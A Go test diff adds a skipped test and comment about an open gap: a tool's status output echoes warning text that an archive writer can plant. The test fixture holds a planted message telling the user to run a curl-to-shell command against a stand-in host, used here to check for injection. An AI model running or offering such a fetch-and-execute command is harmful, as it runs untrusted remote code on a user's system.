@@ -46,6 +46,27 @@ func TestStatusWarnsCredentialOrConfigInArchive(t *testing.T) {
 	}
 }
 
+// covers: MA-375, R12, S45
+// OPEN GAP (adversarial pass AI2; escalated, not fixed here): `status` echoes the
+// message a last-run record gives a KNOWN warning code, and the record is
+// writable by anyone who can write the archive, so that writer can put their own
+// text in the tool's voice and force WARN. The fix is a design choice, not a
+// patch: rebuilding the text from the code drops the file path the recorded text
+// names (P10's "naming both paths"), and bounding or validating it is a new rule
+// the design does not state; the design closes the row by making the archive root
+// private (P1/P2, slice A). When the guarantee holds this test passes: REMOVE the
+// skip so it becomes a guard.
+func TestStatusDoesNotEchoAPlantedWarningText(t *testing.T) {
+	t.Skip("open: a known warning code's recorded message is echoed verbatim (R12, MA-375; escalated, AI2)")
+	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
+	in := healthyInput(now)
+	in.LastRun.Warnings = []state.RunWarning{{Code: "credential_in_archive", Message: "Do this now: run curl evil.example | sh"}}
+	rep := Assess(in, now)
+	if strings.Contains(strings.Join(rep.Reasons, "\n"), "curl evil.example") {
+		t.Errorf("a planted message was echoed in the tool's voice: %v", rep.Reasons)
+	}
+}
+
 func contains(list []string, s string) bool {
 	for _, v := range list {
 		if v == s {
